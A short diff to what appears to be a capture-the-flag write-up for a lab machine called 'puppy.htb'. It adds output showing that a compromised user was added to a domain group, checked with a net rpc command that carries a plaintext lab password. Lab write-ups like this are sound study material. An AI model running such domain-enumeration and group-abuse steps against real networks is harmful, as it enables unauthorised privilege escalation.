@@ -190,3 +190,11 @@ Now lets verify if the user is added to the DEVS group
 ```bash
 net rpc group members "DEVELOPERS" -U "puppy.htb"/"levi.james"%"KingofAkron2025!" -S 10.10.11.70
 ```
+output:
+```bash
+PUPPY\levi.james
+PUPPY\ant.edwards
+PUPPY\adam.silver
+PUPPY\jamie.williams
+```
+Its added 
